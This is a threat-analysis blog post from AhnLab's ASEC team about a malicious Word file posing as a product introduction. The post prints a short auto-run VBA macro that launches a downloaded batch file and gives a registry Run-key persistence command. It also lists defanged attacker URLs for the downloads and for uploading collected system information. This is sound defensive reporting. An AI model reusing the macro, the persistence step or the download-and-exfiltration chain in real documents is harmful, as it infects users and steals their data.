<div>
Posted on <a href="https://asec.ahnlab.com/en/32609/" rel="bookmark" title="9:00 am">March 17, 2022</a>
<h1 class="title">Malicious Word Files Disguised as Product Introduction</h1>
<p>The ASEC analysis team has discovered a word document that is in the same category as the document introduced in the post &lt;<a href="https://asec.ahnlab.com/en/29375/">Word File Disguised as a Design Modification Request for Information Theft</a>&gt;, uploaded in December last year. The title of the document confirmed in this case is ‘Product Introduction.doc’. Given that the document includes descriptions for certain products, the attacker likely targeted companies related to distribution and shopping.</p>
<p>The document contains an image that is the same as the one included in the previous malicious document, prompting users to run the macro.</p>
<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image jetpack-lazy-image--handled" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/%EC%A0%9C%ED%92%88%EC%86%8C%EA%B0%9C%EC%84%9C.png?resize=1024%2C745&amp;ssl=1"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/%EC%A0%9C%ED%92%88%EC%86%8C%EA%B0%9C%EC%84%9C.png?resize=1024%2C745&amp;ssl=1"/><figcaption>Figure 1. Inside Product Introduction.doc</figcaption></figure>
<p>The properties of the document (Created, Author, and Last Modified By) are the same as those of ‘Design Modification Request.doc’. It seems that the attacker is reusing the same file after editing it.</p>
<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image jetpack-lazy-image--handled" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/1doc-%EC%86%8D%EC%84%B1.png?resize=768%2C603&amp;ssl=1"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/1doc-%EC%86%8D%EC%84%B1.png?resize=768%2C603&amp;ssl=1"/><figcaption>Figure 2. Document properties (left: Design Modification Request.doc / right: Product Introduction.doc)</figcaption></figure>
<p>The document contains a malicious VBA macro. When the macro is executed, a malicious macro is automatically run through the Document_Open() function. The macro code is slightly more obfuscated than before, downloading additional files from hxxp://manage-box.com/ord03 or /doc03.</p>
<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/vab.png?resize=768%2C396&amp;ssl=1"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/vab.png?resize=768%2C396&amp;ssl=1"/><figcaption>Figure 3. Part of VBA macro code included in the Word document</figcaption></figure>
<p>The following files are downloaded through the VBA macro. Inside the downloaded file setup.cab, there exist a total of 5 scripts (download.vbs, error.bat, no4.bat, start.vbs, and upload.vbs).</p>
<figure class="wp-block-table"><table><tbody><tr><td class="has-text-align-center">Download URL</td><td class="has-text-align-center">Save path and file name</td></tr><tr><td class="has-text-align-center">hxxp://manage-box[.]com/ord03/no03.txt</td><td class="has-text-align-center">C:\Users\Public\Documents\no1.bat</td></tr><tr><td class="has-text-align-center">hxxp://manage-box[.]com/ord03/vbs03.txt</td><td class="has-text-align-center">C:\Users\Public\Documents\setup.cab</td></tr><tr><td class="has-text-align-center">hxxp://manage-box[.]com/doc03/temp1403.doc</td><td class="has-text-align-center">C:\Users\Public\Documents\temp.doc</td></tr></tbody></table><figcaption>Table 1. Download URL and save path</figcaption></figure>
<p>The macro then runs the downloaded file temp.doc. The word document is disguised as a document of a certain company and contains information about particular products.</p>
<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/tmep%EC%88%98%EC%A0%95.png?resize=1024%2C663&amp;ssl=1"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/tmep%EC%88%98%EC%A0%95.png?resize=1024%2C663&amp;ssl=1"/><figcaption>Figure 4. Inside temp.doc file</figcaption></figure>
<p>The temp.doc document also has the same properties (Created, Author, and Last Modified By) as those from the Design Modification Request.doc file.</p>
<figure class="aligncenter size-large"><img alt="" class="jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/2doc-%EC%86%8D%EC%84%B1.png?resize=768%2C583&amp;ssl=1"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/2doc-%EC%86%8D%EC%84%B1.png?resize=768%2C583&amp;ssl=1"/><figcaption>Figure 5. Document properties
(left: temp.doc downloaded by Design Modification Request.doc
right: temp.doc downloaded by Product Introduction.doc)</figcaption></figure>
<p>The temp.doc document also harbors a VBA macro that runs the no1.bat file that was downloaded earlier.</p>
<code class="language-js">Private Declare PtrSafe Function WinExec Lib "kernel32" ( _
 ByVal lpCmdLine As String, _
 ByVal nCmdShow As Long _
) As Long
Sub Document_Open()
 WinExec "C:\Users\Public\Documents\no1.bat", 0
End Sub</code>
<p>The no1.bat file cannot be confirmed at the moment. Yet as the feature of each script is identical to those in the blog post uploaded earlier, it is likely that the file runs the error.bat file like in the previous case. The table below shows the key behaviors of each script file.</p>
<figure class="wp-block-table"><table><tbody><tr><td>Filename</td><td>Key Behaviors</td></tr><tr><td>error.bat</td><td>Registers start.vbs to registry
Runs no4.bat
Downloads additional files</td></tr><tr><td>start.vbs</td><td>Runs Error.bat</td></tr><tr><td>no4.bat</td><td>Collects and sends information</td></tr><tr><td>download.vbs</td><td>Performs download features</td></tr><tr><td>upload.vbs</td><td>Performs upload features</td></tr></tbody></table><figcaption>Table 2. Script names and their key behaviors</figcaption></figure>
<p>The following command is performed when the error.bat file is executed, allowing start.vbs to run continuously.</p>
<ul><li>“HKCU\Software\Microsoft\Windows\CurrentVersion\Run” /v svchostno2 /t REG_SZ /d “C:\Users\Public\Documents\start.vbs”</li></ul>
<p>Afterward, the command runs no4.bat and checks for the existence of certain files. It then downloads additional files from hxxp://safemaners.com/dow11/%COMPUTERNAME%.txt. The no4.bat file collects information of the user PC as shown below and sends it to hxxp://safemaners[.]com/upl11/upload.php.</p>
<figure class="wp-block-table"><table><tbody><tr><td>Collected Items</td><td>Saved File Name</td></tr><tr><td>C:\Users\%username%\downloads\ list</td><td>%~dp0\cuserdown.txt</td></tr><tr><td>C:\Users\%username%\documents\ list</td><td>%~dp0\cuserdocu.txt</td></tr><tr><td>C:\Users\%username%\desktop\ list</td><td>%~dp0\cuserdesk.txt</td></tr><tr><td>C:\Program Files\ list</td><td>%~dp0\cprog.txt</td></tr><tr><td>IP information</td><td>%~dp0\ipinfo.txt</td></tr><tr><td>tasklist</td><td>%~dp0\tsklt.txt</td></tr><tr><td>systeminfo</td><td>%~dp0\systeminfo.txt</td></tr></tbody></table><figcaption>Table 3. Collected items and saved file names</figcaption></figure>
<p>Currently, accessing the malicious URL (manage-box[.]com and safemaners[.]com) in the word document and script file redirects the user to mail.naver.com. It appears that the attacker is trying to mask the website to make it seem harmless to users.</p>
<p>Since it has been confirmed that there are malicious word documents containing information on distribution and shopping instead of North Korea-related materials, caution is advised for Korean users whom the attacker appears to be targeting. Users should refrain from opening attachments from emails sent from unknown users and make sure to check the sender even when the information is relevant to their situations.</p>
<p>[V3 Detection]</p>
<ul><li>Downloader/DOC.Generic</li><li>Trojan/DOC.Agent</li><li>Trojan/VBS.Runner</li><li>Trojan/BAT.Agent</li><li>Downloader/BAT.Generic</li></ul>
<p>[Relevant IOC Info]</p>
<ul><li>10610cfe6cbf5a7dd5198a87e3186294</li><li>7bc342318717ac411898324baf549b76</li><li>dc5ecb12dae64202922437edbe5a4842</li><li>hxxp://manage-box.com/ord03/no03.txt</li><li>hxxp://manage-box.com/ord03/vbs03.txt</li><li>hxxp://manage-box.com/doc03/temp1403.doc</li><li>hxxp://safemaners[.]com/upl11/upload.php</li></ul>
<p>Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to check related IOC and detailed analysis information.</p>
<figure class="aligncenter size-large"><a href="https://atip.ahnlab.com/main"><img alt="" class="jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2021/07/ASEC_Blog_bn_800x300.png?resize=768%2C288&amp;ssl=1"/><img alt="" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2021/07/ASEC_Blog_bn_800x300.png?resize=768%2C288&amp;ssl=1"/></a></figure>
<p>
Categories:<a href="https://asec.ahnlab.com/en/category/malware-information/" rel="category tag">Malware Information</a> </p>
<p>Tagged as:<a href="https://asec.ahnlab.com/tag/vba-macro/" rel="tag">VBA Macro</a>, <a href="https://asec.ahnlab.com/ko/tag/word/" rel="tag">Word</a>, <a href="https://asec.ahnlab.com/tag/word-document/" rel="tag">Word Document</a></p>
</div>